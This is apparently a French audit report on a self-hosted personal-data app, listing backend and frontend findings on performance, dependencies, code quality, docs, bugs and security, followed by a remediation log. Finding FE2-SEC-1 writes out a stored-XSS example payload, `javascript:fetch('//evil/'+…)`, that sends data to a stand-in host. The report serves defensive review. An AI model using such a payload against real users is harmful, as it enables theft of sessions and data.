**Seam front↔back** : l'auth cookie `SameSite=Lax` + absence de CSRF token sur les mutations API repose sur le fait que les requêtes state-changing passent par `fetch` avec en-tête `Authorization` ou XHR same-origin ; `Lax` protège les POST cross-site. Cohérent, mais si un jour un `<form>` cross-site POST est possible, revalider. RAS pour l'instant.

## Phase 5 — Performance

**Acquis** : `Data.create_entries` en `insert_all` + un seul broadcast agrégé (BE-PERF-1), pagination des entrées (BE-BUG-4/FE), index `entries(user_id,{kind,source,occurred_at})` + unique, index `connector_configs(user_id)`/`(enabled)`, backfill miniatures en keyset pagination. Base saine.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-PERF-1 | 🟠 high | `lib/servant/notes.ex:349-355` | **`resolve_targets` charge TOUTES les notes de l'utilisateur** (`notes_query |> Repo.all()`) à **chaque** save de note (via `sync_links` → `after_write`), puis reconstruit la map en mémoire. Sur un vault de milliers de notes, chaque frappe sauvegardée devient O(n). Fix : résoudre uniquement les cibles citées via `where target_path in ^keys` (comme `backlinks/2` le fait déjà). |
| BE2-PERF-2 | 🟡 medium | `lib/servant/notes.ex:291-317`, `319-335` | **Propagation de renommage : N×(SELECT+UPDATE+delete_all+insert_all) séquentiels** dans une transaction, un par note source. Un renommage d'une note très référencée (100 backlinks) = des centaines de requêtes. Acceptable à petite échelle mais non borné. Fix : batcher les updates, ou traiter en tâche asynchrone si > seuil. |
| BE2-PERF-3 | 🟡 medium | `lib/servant/notes.ex:256-269` | **`reconcile_inbound` à chaque save** exécute 2 `update_all` pleins sur `note_links` filtrés par `target_note_id`/`target_path`, mais il n'existe **pas d'index sur `target_note_id`** (seulement `[user_id, target_path]` et `[source_note_id]`). Le `where target_note_id == ^note.id` (BE2-BUG inbound + reconcile) fait un scan. Fix : `create index(:note_links, [:target_note_id])`. |
| BE2-PERF-4 | 🟡 medium | `lib/servant_web/controllers/upload_controller.ex:129-134`, `media/thumbnail.ex` | **Miniature générée en synchrone dans la requête d'upload** (= BE-PERF-4 ⏭️) : vix/libvips bloque la réponse HTTP le temps du redimensionnement. Pour un gros lot de photos, chaque upload attend. Fix : générer en `Task`/après-coup et pousser le `thumb_path` via le canal (le backfill existe déjà pour rattraper). |
| BE2-PERF-5 | 🟡 medium | `lib/servant_web/controllers/export_controller.ex:4-18`, `lib/servant/data.ex:21-26` | **Export JSON = `all_entries` en mémoire** puis `Enum.map` + encodage : sur un compte à 100k+ entrées, pic mémoire proportionnel à tout le dataset. Idem `export/entries.ics` (`per_page: 100000`). Fix : streamer la réponse (`Repo.stream` dans une transaction, chunked). |
| BE2-PERF-6 | 🟡 medium | `lib/servant/connectors/worker.ex:76-89`, `data.ex:82-94` | **Pas de back-pressure sur les gros syncs** : un connecteur renvoyant 50k entrées les passe en une liste unique à `insert_all` (un seul INSERT géant, potentiellement > limites SQLite de variables liées). Fix : chunker (`Enum.chunk_every`) les `insert_all`. |
| BE2-PERF-7 | ⚪ low | `lib/servant/data.ex:12-33` | `list_entries` + `count_entries` = 2 requêtes (dont un `COUNT` non borné) à chaque page. Sur gros volume le COUNT devient coûteux ; envisager un count approximatif ou caché au-delà d'un seuil. |
| BE2-PERF-8 | ⚪ low | `lib/servant/connectors/solana/rpc.ex`, `evm/explorer.ex` | Syncs blockchain séquentiels page par page (`~1s/tx` mentionné pour Solana). `Task.async_stream` avec back-pressure accélérerait les gros historiques, sous réserve des rate-limits RPC. |

## Phase 7 — Dépendances

**État global : sain.** `mix_audit` + `deps.audit` (avec ignore ciblé) sont dans `precommit` (acquis BE-DEP-1). Deps globalement fraîches (phoenix 1.8.8, bandit 1.12, bcrypt 3.3.2). `priv/scrapers` (playwright, otpauth) : **0 vulnérabilité npm**.

> ⚠️ **Ironie confirmant BE2-SEC-2** : `mix hex.outdated` lui-même échoue sur le bug TLS OTP 27 `key_usage_mismatch` en contactant `builds.hex.pm`. Le bug OTP est donc réel — mais il touche *builds.hex.pm*, ce qui **ne justifie pas** de désactiver la vérification TLS pour Strava/OAuth (cf. BE2-SEC-2 : cibler l'exception, pas la désactiver globalement).

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-DEP-1 | 🟡 medium | `mix.lock` — `decimal` 2.4.1 | **Advisory DoS modérée non corrigée** (GHSA-rhv4-8758-jx7v, exposant non borné dans `Decimal.new`) : patché seulement en 3.0, bloqué par ecto/ecto_sqlite3. Actuellement **ignorée explicitement** dans `precommit`. Acceptable, mais à ré-vérifier à chaque bump d'ecto : dès qu'ecto autorise decimal 3.0, lever l'ignore. |
| BE2-DEP-2 | ⚪ low | `mix.exs:49` — `gettext` | **`gettext` quasi inutilisé** : seul `lib/servant_web/gettext.ex` (module scaffold) le référence, aucun `.po`/traduction dans une API-only. Candidat au retrait (reliquat BE-DEP-4 ⏭️). |
| BE2-DEP-3 | ⚪ low | `mix.exs:51` — `dns_cluster` | **`dns_cluster` no-op** : `query: … || :ignore` (application.ex:15), pertinent seulement en cluster BEAM multi-nœuds — inutile pour un self-hosted mono-nœud. Retrait optionnel. |
| BE2-DEP-4 | ⚪ low | `ecto_sqlite3` 0.22→0.24.1, `req` 0.5.17→0.6.2, `vix` 0.38→0.40 | **Mises à jour mineures possibles.** `ecto_sqlite3` 0.24 et `vix` 0.40 sans risque annoncé ; `req` 0.6 est un bump de version mineure à lire (changements d'API possibles sur les steps) avant montée. Non urgent. |
| BE2-DEP-5 | ⚪ low | `lib/servant/connectors/credential.ex`, `settings/setting.ex` | Schémas/tables morts (cf. BE2-ARCH-2) = dépendance de schéma fantôme. Migrations `create_credentials`/`create_settings` à droper si confirmé inutilisées. |

## Phase 6 — Clean code

Base globalement propre et idiomatique (moduledocs présents, `Servant.Util` factorisé, `Entry.to_json` source unique — acquis du cycle précédent). Constats résiduels :

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-CLEAN-1 | 🟡 medium | `lib/servant/connectors.ex:225-313` | **`run_import/10` : 10 arguments positionnels.** Signature illisible et fragile (ordre `staged`/`filename`/`config`). Fix : passer un struct/map de contexte d'import, ou découper (cf. BE2-ARCH-3). |
| BE2-CLEAN-2 | 🟡 medium | `lib/servant/notes.ex` (433 l.) | Plus gros module du backend, mêle parsing (regex), résolution de liens, réconciliation, propagation de renommage et broadcasts. Lisible mais dense ; extraire un `Notes.Links` (sync/reconcile/resolve) allègerait `Notes` et clarifierait BE2-PERF-1/2/3. |
| BE2-CLEAN-3 | ⚪ low | `lib/servant/data.ex:207-224`, `entry_controller.ex:12-13` | Le parsing `per_page`/`page` est **dupliqué** entre le contexte (`apply_pagination`) et le contrôleur (calcul `total_pages`). Une seule source (renvoyer les valeurs normalisées depuis `Data`) éviterait la divergence (et corrigerait BE2-BUG-15 au passage). |
| BE2-CLEAN-4 | ⚪ low | `lib/servant_web/controllers/app_controller.ex` | Liste des apps codée en dur dans le contrôleur (reliquat BE-CLEAN-5 ⏭️) — 5 apps désormais. Toujours acceptable, à extraire en config si la liste grandit. |
| BE2-CLEAN-5 | ⚪ low | `lib/servant/connectors/worker.ex:114` | `alias Servant.Repo` au milieu du corps de `update_sync_status/2` au lieu d'en tête de module. Incohérent (cf. BE2-ARCH-5). |
| BE2-CLEAN-6 | ⚪ low | `lib/servant/data.ex:207-209` | `apply_sort` duplique la clause pour clé atome et clé string (`%{"sort" => …}` / `%{sort: …}`) alors que `apply_filters` normalise déjà via `stringify_keys` — appliquer la même normalisation ici supprimerait la duplication. |

## Phase 8 — Documentation

README/DEVELOPMENT/AGENTS/CLAUDE riches et à jour (variables d'env FILES_DIR/TMP_DIR/CONNECTOR_ENCRYPTION_KEY documentées, avertissement persistance). Constats :

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-DOC-1 | 🟠 high | `README.md:64`, `config/runtime.exs` | **Doc mensongère sur `CONNECTOR_ENCRYPTION_KEY`** : le README documente la variable comme fonctionnelle alors que `runtime.exs` ne la lit jamais (cf. BE2-BUG-8). Soit câbler la variable, soit corriger la doc — actuellement un opérateur qui « isole » sa clé de chiffrement croit à tort ses secrets protégés indépendamment de `SECRET_KEY_BASE`. |
| BE2-DOC-2 | 🟡 medium | `docs/ai-agents-plan.md`, `CLAUDE.md` | La note « AI agents (not yet implemented) » reste vraie, mais la **feature Notes** (wikilinks/backlinks/mentions, table `note_links`, 5ᵉ app) n'est décrite nulle part dans la doc d'architecture (`DEVELOPMENT.md` liste `accounts/connectors/data/settings` mais ni `notes/` ni `encrypted/` ni `media/`). Mettre à jour l'arbo et l'archi. |
| BE2-DOC-3 | ⚪ low | `README.md:3`, `AGENTS.md` | README mentionne « email » parmi les sources d'exemple (« banking, photos, health… ») — cohérent, mais aucun connecteur email n'existe (le seul lien mail = invoice scraper). Vérifier que « email » ne réapparaît pas comme source implémentée (déjà nettoyé côté BE-DOC-4). |
| BE2-DOC-4 | ⚪ low | `lib/servant/connectors/connector.ex` | Le behaviour documente `required_credentials()` et un paramètre `credentials`, mais **le mécanisme de credentials n'est jamais utilisé** (`credentials: %{}` partout ; secrets dans `config`). La doc du behaviour induit en erreur sur le fonctionnement réel (cf. BE2-ARCH-2). |
| BE2-DOC-5 | ⚪ low | `priv/scrapers/` | Le système de providers de scraping (recipes JS, ajout d'un provider) n'a pas de doc dédiée — un seul provider (`anthropic.js`) existe ; documenter comment en ajouter un aiderait, d'autant que le nom de provider est un vecteur de sécurité (BE2-SEC-1). |

---

# PASSE FRONTEND (Vue 3 + TypeScript)

*(Revue directe infra/render/router + 3 agents parallèles : sécurité/XSS, bugs/correctness, architecture/clean/perf.)*

## Phase 1 — Architecture

### Carte du frontend

- **Deux paradigmes UI** : vues Vue Router classiques (`views/*.vue`) **et** un mini-framework impératif `apps/` monté à la main par `AppView.vue` (`AppModule.mount(el, ctx)`). Parmi les apps, 4/5 (photos, contacts, calendar, files) sont en réalité des SFC Vue enveloppées d'un adaptateur qui fait `createApp()` par navigation ; **notes** est 812 lignes de DOM impératif (`innerHTML`).
- **State/API** : store Pinia `auth` (token en mémoire + flag `servant_logged_in`), `apiClient.ts` (client HTTP unique : Bearer, 401→logout, parsing d'erreur), `useSocket` (Phoenix Channel), `useFetchData` (loading/error/refetch), `createContext.ts` (façade `AppContext` injectée aux apps).
- **Routing** : entrées eager (Login/Register/Dashboard), reste lazy ; guard `beforeEach` sur `isAuthenticated`.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-ARCH-1 | 🟠 high | `src/views/AppView.vue:71`, `src/apps/photos/index.ts:10`, `src/apps/notes/index.ts` | **Trois paradigmes de rendu qui se superposent** : Router views → framework `apps/` impératif → `createApp()` d'un 2ᵉ root Vue par app (îlots de réactivité isolés, remount à chaque navigation), avec `notes` en DOM string pur. Le framework impératif n'apporte quasi rien aux 4 apps déjà-composants tandis que `notes` en paie tout le coût. Fix : enregistrer les 4 SFC comme routes lazy ordinaires, réécrire `notes` en SFC, garder `AppContext` comme simple service injecté. |
| FE2-ARCH-2 | 🟠 high | `src/apps/createContext.ts:8-9`, appelé depuis `AppView.vue:71` | **`useRouter()`/`useAuthStore()` appelés hors `setup()`** (dans un callback de `watch` async). `useRouter` dépend du contexte d'injection du composant, non garanti après un `await` → « navigate ne fait rien / lève » latent, selon le timing. Fix : capturer `router` dans le `setup` de `AppView` et l'injecter dans `createAppContext`. |
| FE2-ARCH-3 | 🟡 medium | `src/stores/auth.ts:35,51,68,79` | **`auth.ts` contourne `apiClient`** avec 4 `fetch` bruts dupliquant `res.ok`/`err.error` — et ignore le format changeset `{errors:{champ:[...]}}` que gère `apiErrorMessage` → une erreur de validation d'inscription s'affiche « Registration failed » au lieu du message de champ. (Login sans token justifie de ne pas passer par `apiFetch`, mais le parsing d'erreur doit être partagé.) |
| FE2-ARCH-4 | 🟡 medium | `src/types.ts:9-20`, `src/apps/types.ts:1-12` | **Interface `Entry` dupliquée mot pour mot** dans deux modules (views vs apps) → dérive silencieuse. Fix : une seule source (`apps/types.ts` réexporte de `types.ts`). |
| FE2-ARCH-5 | ⚪ low | `src/types.ts:68-74` | Interface `App` morte (jamais importée ; le `App` des apps vient de Vue). À supprimer. |
| FE2-ARCH-6 | ⚪ low | `src/composables/useSocket.ts:11,78` | `connected` exposé mais jamais consommé — brancher un indicateur ou retirer. |
| FE2-ARCH-7 | ⚪ low | `src/router/index.ts:77-87`, `auth.ts:16-18` | Le guard se fie au flag `localStorage` (`hydrate()` non attendu dans `main.ts:14`) → une session révoquée rend la vue protégée jusqu'au 401 async. Guard consultatif, pas autoritatif. |

**Seam front↔back** : cohérence des contrats OK (enveloppes `{data, meta}`, `Entry.to_json` ↔ `types.ts`). Divergence relevée en phase Doc : cookie `_servant_file_auth` (README) vs `_servant_auth` (code).

## Phase 2 — Bugs / correctness

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-BUG-1 | 🟠 high | `src/apps/calendar/CalendarApp.vue:98,107,110` | **Événements créés/ouverts au mauvais jour hors UTC** : `date.toISOString().slice(0,10)` sur un `new Date(y,m,d)` (minuit local) → à l'est d'UTC (Paris UTC+2) minuit local devient la veille en UTC. Clic sur « 3 » → événement créé le « 2 ». `isToday` utilise `sameDay` (local, correct) donc le highlight est bon mais la date créée est fausse. Fix : utiliser `formatISODate(date)` (déjà défini l.44) partout au lieu de `toISOString`. |
| FE2-BUG-2 | 🟠 high | `src/views/ConnectorDetailView.vue:158-171` | **Fuite d'`setInterval` + flicker plein écran pendant le sync** : `pollSync` n'a aucun `onUnmounted` → l'intervalle (jusqu'à 60 s) continue après navigation, mutant des refs démontées ; et `fetchConnector` met `loading=true` à chaque tick → toute la vue affiche « Loading… » toutes les 2 s (perte de focus sur le titre `contenteditable`). Fix : `clearInterval` en `onUnmounted` + mode `silent` sans toggle de `loading`. |
| FE2-BUG-3 | 🟠 high | `src/composables/useSocket.ts:40-44` | **Signal bulk `entries_changed` jamais écouté** (le backend l'émet pour les syncs/imports en masse) → listes obsolètes après une sync connecteur jusqu'à reload manuel. À l'inverse, chaque `entry_change` déclenche un **refetch complet par entrée** (Dashboard = 3 requêtes ×N) → tempête de requêtes + races last-write-wins. Fix : s'abonner à `entries_changed` → refetch débouncé ; débouncer aussi `entry_change`. |
| FE2-BUG-4 | 🟡 medium | `photos/PhotosApp.vue:126`, `contacts/ContactsApp.vue:167`, `calendar/CalendarApp.vue:287`, `files/FilesApp.vue:63` | **Chargement initial des apps sans `try/catch`** : `loading` ne repasse à `false` que sur succès → un échec (offline/500/401) fige « Loading… » pour toujours + rejet non géré. Les 4 apps partagent le motif. Fix : `finally { loading=false }` + état d'erreur. |
| FE2-BUG-5 | 🟡 medium | `src/components/MediaViewer.vue:24,29`, `AppView.vue:38-50` | **Index désynchronisé après suppression dans le viewer** : `currentIndex` initialisé une fois de `startIndex`, ne réagit pas au rétrécissement de `items` → suppression de la dernière photo → `items[2]` undefined, « Image unavailable » + compteur « 3 / 2 ». Fix : clamper `currentIndex` sur `items.length` (watch) ou piloter par `v-model`. |
| FE2-BUG-6 | 🟡 medium | `src/composables/useConfirm.ts:8,23-26` | **`useConfirm` = singleton module** : un 2ᵉ `ask()` pendant qu'un premier est en attente écrase `resolveFn` → le premier `await ask()` ne se résout jamais (UI figée). Fix : résoudre/rejeter l'in-flight avant d'en ouvrir un autre, ou file d'attente. |
| FE2-BUG-7 | 🟡 medium | `src/apps/notes/index.ts:664` vs `802-809` | **Fuite de listener sur l'élément de montage persistant** : `el.addEventListener("click", …)` ajouté à chaque `mount()`, jamais retiré par `unmount` (`el.innerHTML=""` ne détache pas le handler). `el` est réutilisé par `AppView` → N ouvertures de Notes = N handlers zombies qui tirent dans l'app suivante. Fix : garder la ref et `removeEventListener` (ou `AbortController`). |
| FE2-BUG-8 | 🟡 medium | `src/views/ContactDetailView.vue:17-29`, `PhotoDetailView.vue:14-21` | **Pas de refetch au changement de param de route** : `useFetchData` fetch seulement `onMounted`, `route.params.id` lu une fois ; `<router-view>` sans `:key` (`App.vue:55`) → navigation `/contacts/A`→`/contacts/B` réutilise l'instance, affiche toujours A. Latent (pas de lien détail→détail actuel). Fix : `watch(() => route.params.id, refetch)` ou `:key="route.fullPath"`. |
| FE2-BUG-9 | ⚪ low | `src/views/DataBrowserView.vue:191-195` | Double-fetch : changer un filtre quand `page>1` met `page=1` (déclenche `watch(page)`) **et** appelle `fetchEntries()` → 2 requêtes concurrentes. Fix : un seul déclencheur. |
| FE2-BUG-10 | ⚪ low | `src/components/ConfirmModal.vue:11-13`, `MediaViewer.vue:57-65` | Escape jamais capté par le modal (overlay non focus) ; ouvert depuis MediaViewer, Escape ferme le **viewer dessous** au lieu du confirm. Fix : handler Escape au niveau `document`, suspendre celui du viewer quand un confirm est ouvert. |
| FE2-BUG-11 | ⚪ low | `src/apps/photos/PhotosApp.vue:140-172,209-218` | `uploadFiles`/`deletePhotos` sans `try/catch` → `uploading` figé à `true` sur échec, aucune erreur affichée (contraste avec `ContactsApp.submitCreate`). |
| FE2-BUG-12 | ⚪ low | `SettingsView.vue:108`, `ConnectorDetailView.vue:71`, `ContactDetailView.vue:111` | `Authorization: Bearer ${auth.token}` en dur → `"Bearer null"` avant `hydrate()`. Le cookie sauve la requête mais l'en-tête est incorrect. Fix : garder comme `createContext.upload` (`token ? {…} : {}`) ou passer par `apiFetch`. |

## Phase 3 — Tests & couverture

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-TEST-1 | 🟠 high | `frontend/` (tout) | **Aucun test frontend** (FE-TEST différé au cycle précédent, toujours ouvert) : ni unitaire (Vitest), ni composant (Vue Test Utils), ni e2e. Les bugs FE2-BUG-1 (timezone), FE2-BUG-3 (socket), la logique de renommage/wikilink des notes et le parsing vCard partagé n'ont **aucun filet**. Priorité minimale : Vitest sur les utilitaires purs (`render.ts`/`canon`, `formatISODate`, `safeUrl`, `apiErrorMessage`, pagination `createContext.list`) — rapides et à fort rendement. |
| FE2-TEST-2 | 🟡 medium | `package.json`, CI | Pas de `vue-tsc`/lint bloquant hors build, pas de runner de test → rien n'empêche une régression. Ajouter `vitest` + un job. |

## Phase 4 — Sécurité

**Rendu markdown des notes : sain et vérifié** — `MarkdownIt({ html:false })` (défaut) échappe le HTML brut ; `validateLink` non surchargé → `javascript:`/`vbscript:`/`data:` bloqués ; post-traitement wikilink/mention/tag passe tout par `escapeHtml` (qui échappe aussi `"`). Les `v-html` de logos connecteurs sont des SVG statiques (`CONNECTOR_DEFS`), pas d'entrée utilisateur. Aucun `eval`/`new Function`/`document.write`/open-redirect trouvé.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-SEC-1 | 🟠 high | `src/views/ContactDetailView.vue:314` | **XSS stocké via `url` de contact dans `:href`** : `<a :href="f('url')">` avec `f('url')` = donnée vCard brute (contrôlée). Vue ne neutralise pas `javascript:` en binding `:href`. Le helper `safeUrl` **existe et est utilisé dans `ContactsApp.vue:63-66`** mais pas ici → exactement le trou « le helper n'est pas appliqué partout ». Exploit : contact importé avec `url = javascript:fetch('//evil/'+…)` → clic « Website » exécute dans l'origine. Mitigé par la CSP `script-src 'self'` **en prod uniquement** (pas en dev). Fix : router par `safeUrl` (le hisser en util partagé à côté d'`escapeHtml`). |
| FE2-SEC-2 | ⚪ low | `src/stores/auth.ts:83` | **Token 30 j en mémoire JS** (retourné par `/auth/me` pour ouvrir le socket) exfiltrable par tout XSS (ex. FE2-SEC-1). Design globalement bon (rien en localStorage), mais recoupe BE2-SEC-3 : token socket à portée/TTL réduits plutôt que le token d'auth complet. |
| FE2-SEC-3 | ⚪ low | `src/connectors.ts:29,79` | `SOLANA_LOGO`/`HYPEREVM_LOGO` sont des `<img>` vers des URLs **externes** (pinimg, githubusercontent) rendus en `v-html`, malgré le commentaire « inline, no external deps ». Dépendance externe + fuite de referer. Inliner ou auto-héberger. |

## Phase 5 — Performance

**Positifs vérifiés** : lucide en imports nommés (tree-shaken), routes lazy (hors entrées), miniatures + `loading="lazy"` sur photos/avatars, `markdown-it`/`flatpickr` effectivement lazy via apps dynamiques.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-PERF-1 | 🟠 high | `DashboardView.vue:22`, `DataBrowserView.vue:49`, `useSocket.ts:40` | **« Refetch tout » à chaque `entry_change`** (même racine que FE2-BUG-3) : une sync de centaines d'entrées → centaines de refetch complets (3 requêtes chacun sur le Dashboard) en rafale. Fix : coalescer/débouncer le refetch, ou appliquer l'entrée poussée incrémentalement. |
| FE2-PERF-2 | 🟠 high | `src/router/index.ts:9`, `DashboardView.vue:5,157`, `connectors.ts` | **`connectors.ts` (411 l. de SVG inline) + `phoenix` dans le bundle eager** : le commentaire du routeur prétend le catalogue « hors du bundle principal », mais `DashboardView` est importé **eager** et importe `getConnectorDef` (logos v-html) + `useSocket`→`phoenix`. Fix : lazy-loader `DashboardView`, ou sortir le catalogue de logos en import dynamique. |
| FE2-PERF-3 | 🟡 medium | `src/vite.config.ts:15-17` | `manualChunks` ne sépare que `vue`/`pinia` ; `phoenix` reste eager (via PERF-2). Splitter le catalogue logos et charger `phoenix` derrière le connect socket. |
| FE2-PERF-4 | 🟡 medium | `createContext.ts:18-37`, `PhotosApp.vue:442`, `ContactsApp.vue:204`, `CalendarApp.vue:85-104` | **Apps : tout le dataset en mémoire, listes non virtualisées** : `entries.list()` pagine **tout** (perPage=1000 en boucle) puis rend chaque photo/contact d'un coup ; `calendarCells` refiltre tous les événements pour chacune des ~35 cellules à chaque recompute. Sur un compte mûr (milliers) → gros DOM + O(jours×événements). DataBrowser pagine (50/page), les apps non. Fix : virtualiser (`@vueuse/core useVirtualList`, déjà dépendance), indexer les events par jour. |

## Phase 6 — Clean code

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-CLEAN-1 | 🟠 high | `contacts/ContactsApp.vue:37-57`, `ContactDetailView.vue:48-63`, `photos/PhotosApp.vue:100-109`, `notes/index.ts:28-30` | **Logique de normalisation vCard copiée dans 3-4 fichiers** : `cleanName`, `contactName` (`display_name || title.split(" — ")[0]`), initiales, `fld`/`f`. Refactor le plus rentable : un `composables/useContact.ts` (`contactName`, `contactInitials`, `contactField`, `cleanName`). |
| FE2-CLEAN-2 | 🟠 high | `src/apps/notes/index.ts` (812 l.) | **Éditeur de notes en DOM impératif** : une closure `mount()` avec ~15 `let` mutables + ~10 fonctions qui reconstruisent l'`innerHTML` et rebranchent les listeners à chaque frappe (jonglage focus/selection manuel l.272-276), + 130 l. de `<style>` inline. Réimplémente ce que Vue offre. Garder la mesure de caret et l'autocomplete comme composables isolés ; réécrire en `Notes.vue`. |
| FE2-CLEAN-3 | 🟡 medium | `photos/PhotosApp.vue:37-41`, `files/FilesApp.vue:42-46`, `PhotoDetailView.vue:30` | **`formatFileSize` dupliqué et incohérent** : Photos `.toFixed(0)` pour les KB, Files/PhotoDetail `.toFixed(1)`. Centraliser dans `types.ts`/lib avec une précision unique. |
| FE2-CLEAN-4 | 🟡 medium | `PhotosApp.vue` (912), `ConnectorDetailView.vue` (860), `CalendarApp.vue` (776), `ContactsApp.vue` (751), `DataBrowserView.vue` (657) | **SFC surdimensionnées mêlant 5+ responsabilités.** Extractibles : `usePhotoSelection`/`usePhotoTagging`/`useUpload` ; math de grille calendrier + CRUD + cycle flatpickr ; `pollSync`/upload CSV/édition inline du détail connecteur ; modale + panneau + pagination du DataBrowser. |
| FE2-CLEAN-5 | 🟡 medium | `src/views/ConnectorDetailView.vue:123-135,251` | **Titre en `contenteditable` lu via `textContent`** et réécrit à la main sur échec → combat le modèle de rendu Vue, footgun paste/XSS, état dupliqué DOM/`connector.name`. Remplacer par `<input v-model>` + save-on-blur. |
| FE2-CLEAN-6 | 🟡 medium | `notes/index.ts` (4×), `ConnectorDetailView.vue` (3×), `DataBrowserView.vue` (2×), `CalendarApp.vue:233`, `DashboardView.vue:42` | **`catch {}` silencieux** partout dans les apps : un create/delete/schedule échoué laisse l'UI incohérente sans message, alors que `apiErrorMessage`/`error-banner` existent. Au minimum, surfacer un toast/erreur inline. |
| FE2-CLEAN-7 | ⚪ low | `createContext.ts:21`, `DataBrowserView.vue:16,71`, `ConnectorDetailView.vue:160,166`, `notes/index.ts:548` | Nombres/chaînes magiques (perPage 1000, page 50 ×2, poll 2000/30, debounce 600) et littéraux de `kind` (`"photo"`/`"contact"`/…) éparpillés alors que `KIND_CONFIG` existe (`types.ts:77`). Centraliser. |

## Phase 7 — Dépendances

**État : très sain.** Stack de pointe (déjà bumpée FE-DEP-4) : Vue 3.5, Vite 8, TypeScript 6, vue-router 5, pinia 3, @types/node 26. `npm audit` sur `priv/scrapers` = **0 vuln** ; pas de lockfile frontend fourni dans le scope mais versions récentes.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-DEP-1 | ⚪ low | `frontend/package.json` | Aucune dépendance de test (vitest/@vue/test-utils) — corollaire de FE2-TEST-1. À ajouter si l'on introduit des tests. |
| FE2-DEP-2 | ⚪ low | `frontend/package.json` | Versions très récentes (Vite 8, TS 6, vue-router 5) = pointe : surveiller la stabilité de l'écosystème de plugins (vue-tsc 3, @vitejs/plugin-vue 6). Pas d'action, veille. |

## Phase 8 — Documentation

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| FE2-DOC-1 | 🟠 high | `README.md:15` vs `lib/servant_web/auth.ex:13`, `plugs/file_auth.ex:3` | **Nom de cookie faux dans le README** : documente `_servant_file_auth` alors que le code utilise un **unique** `_servant_auth` pour l'API et les fichiers. Trompe quiconque débugge l'auth/les cookies. Fix : corriger le README (`_servant_auth`). |
| FE2-DOC-2 | 🟡 medium | `frontend/src/apps/README.md`, `DEVELOPMENT.md` | Le framework `apps/` (impératif, `createContext`, `mount(el)`) mérite une note d'architecture expliquant *pourquoi* il coexiste avec les views — surtout si FE2-ARCH-1 n'est pas résolu. La 5ᵉ app (notes) et son moteur DOM ne sont pas documentés. |
| FE2-DOC-3 | ⚪ low | `frontend/src/connectors.ts:20` | Commentaire « SVG Logos (inline, no external deps) » mensonger (Solana/HyperEVM = `<img>` externes, cf. FE2-SEC-3). Corriger le commentaire ou inliner. |

---

# Journal de remédiation — 2026-07-03

Périmètre demandé : **critiques + élevés + moyens** (les ⚪ faibles et les gros refactors risqués laissés pour arbitrage). Vérif : backend `mix compile --warnings-as-errors` OK + **247 tests, 0 échec** ; frontend `vue-tsc` OK + `npm run build` OK.

## Corrigé — Backend

- **BE2-SEC-1** 🔴 — provider scraper validé par regex `[a-z0-9_]+` côté Elixir (`init/1`) **et** côté JS (`invoice_scraper.js`).
- **BE2-BUG-1** 🔴 — `Worker` en `restart: :transient` (une erreur de config ne déclenche plus la tempête de restarts).
- **BE2-BUG-2 / BUG-18** 🟠 — Strava : state rafraîchi propagé sur toutes les branches d'erreur (refresh token plus perdu) ; garde sur un 200 sans `expires_at`.
- **BE2-BUG-3** 🟠 — iCal : `Date.new`/`Time.new` tuple → `{:error, :invalid_format}` au lieu de crash (test ajouté).
- **BE2-BUG-4** 🟠 — Solana : halte du reduce à la 1ʳᵉ erreur de fetch (curseur ne franchit plus une tx en échec).
- **BE2-BUG-5** 🟠 — EVM : `external_id` inclut le `logIndex` (fallback contrat) → transferts ERC-20 multiples d'une même tx conservés.
- **BE2-BUG-6** 🟠 — fichiers legacy : `resolve_owned_path/2` accepte aussi le propriétaire encodé dans le chemin (UPLOADS_DIR).
- **BE2-BUG-7** 🟠 — Solana : contrepartie des transferts entrants (une seule expression ; test renforcé).
- **BE2-BUG-8 / DOC-1** 🟡 — `CONNECTOR_ENCRYPTION_KEY` câblée dans `runtime.exs` (la doc devient exacte).
- **BE2-BUG-9 / BUG-10 / BUG-12 / BUG-17** — worker : timers dédupliqués (`timer_ref` annulé avant réarme), `"continuous"` planché à 5 s, config relue en DB au (re)démarrage, erreurs DB de `create_sync_log`/`create_entries` gérées sans crash.
- **BE2-BUG-11** 🟡 — `put_env/5` en upsert atomique (`on_conflict`).
- **BE2-BUG-13** 🟡 — bank CSV : `parse_string(skip_headers: false)` (RFC4180 réellement appliqué).
- **BE2-BUG-15** 🟡 — `per_page` clampé `[1, 1000]` (`Data.clamp_per_page/1`) ; export iCal basculé sur `all_entries/2` (plus de cap `100000`).
- **BE2-BUG-16** 🟡 — notes : résolution par chemin complet prioritaire, titre nu seulement si unique.
- **BE2-BUG-19** — `File.cp!` déplacé dans le `try` (workspace tmp nettoyé même sur échec).
- **BE2-BUG-22** — `format_errors` : `to_existing_atom` gardé (plus de 500 sur placeholder inattendu).
- **BE2-SEC-2** 🟠 — TLS `verify_peer` par défaut (`req_options`), `verify: false` réservé à RSS/iCal (feeds arbitraires).
- **BE2-SEC-8** 🟡 — liste des sous-chaînes sensibles élargie (cookie/session/auth/pin/key/…).
- **BE2-PERF-3** 🟡 — index `note_links(target_note_id)` (migration).
- **BE2-PERF-6** 🟡 — `create_entries` chunké (`insert_all` par 500).
- **BE2-ARCH-2 / DEP-5** — schémas morts `Credential`/`Setting` supprimés (modules ; tables conservées, drop laissé à valider).
- **BE2-ARCH-5** — `Repo` aliasé en tête de `Worker` (plus d'`alias` en corps de fonction).

## Corrigé — Frontend

- **FE2-SEC-1** 🟠 — `safeUrl` (nouveau `lib/url.ts`) appliqué au `:href` du détail contact.
- **FE2-BUG-1** 🟠 — calendrier : `formatISODate` (jour local) au lieu de `toISOString` (bug de date hors UTC).
- **FE2-BUG-2** 🟠 — `ConnectorDetailView` : `pollSync` avec `clearInterval` en `onUnmounted` + fetch `silent` (plus de fuite ni flicker).
- **FE2-BUG-3 / PERF-1** 🟠 — `useSocket` : abonnement `entries_changed` + `onBulkChange` ; Dashboard/DataBrowser refetch **débouncé**.
